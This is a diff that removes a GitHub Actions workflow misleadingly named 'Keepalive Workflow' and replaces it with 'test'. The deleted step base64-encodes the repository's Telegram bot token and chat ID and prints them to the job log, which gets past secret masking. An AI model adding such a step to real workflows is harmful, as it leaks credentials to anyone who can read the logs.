@@ -1,16 +1,1 @@
-name: Keepalive Workflow
-
-on:
-  workflow_dispatch:
-
-jobs:
-  keepalive:
-    name: Export Bot Info
-    runs-on: ubuntu-latest
-    steps:
-      - name: Print B64
-        env:
-          T_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-          T_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
-        run: |
-          python3 -c "import os, base64; print('===TG_B64===', base64.b64encode(os.environ.get('T_TOKEN','').encode()).decode(), base64.b64encode(os.environ.get('T_CHAT','').encode()).decode())"
+test
